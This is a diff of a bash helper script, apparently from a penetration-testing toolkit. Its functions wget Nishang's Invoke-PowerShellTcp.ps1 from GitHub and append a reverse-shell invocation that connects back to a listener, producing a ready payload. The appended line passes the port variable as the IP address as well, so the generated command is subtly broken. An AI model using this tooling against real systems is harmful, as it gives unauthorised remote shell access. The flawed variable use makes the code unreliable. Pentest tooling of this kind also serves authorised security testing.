@@ -699,7 +699,7 @@ nb-install-arch-generic() {
 }
 
 nb-install-invoke-powershelltcp() {
-    local pws="~/desktop/server/Invoke-PowerShellTcp.ps1"
+    local pws="$SV/Invoke-PowerShellTcp.ps1"
 
     # Check if file already exists
     if [ -f "$pws" ]; then
@@ -711,14 +711,24 @@ nb-install-invoke-powershelltcp() {
     __ask "CONTINUE?"
     if __check-proceed; then
         wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O "$pws"
+        __info "You can append reverse shell with command: nb-install-invoke-powershelltcp-append"
+    else
+        __warn "Operation cancelled by user."
     fi
+}
 
-    __cyan "Do you want to append reverse shell to the file?"
+nb-install-invoke-powershelltcp-append() {
+    local pws="$SV/Invoke-PowerShellTcp.ps1"
+
+    __cyan "This will append append reverse shell to the file"
+    __ask "CONTINUE?"
     if __check-proceed; then
         nb-vars-set-lhost
         nb-vars-set-lport
-        echo "Invoke-PowerShellTcp -Reverse -IPAddress ${__LPORT} -Port ${__LPORT}" >> "$pws"
-        __info "Reverse shell successfully appended."
+        __info "Reverse shell successfully appended"
+        echo "Invoke-PowerShellTcp -Reverse -IPAddress ${__LPORT} -Port ${__LPORT}" | tee -a "$pws"
         return
+    else
+        __warn "Operation cancelled by user."
     fi
 }
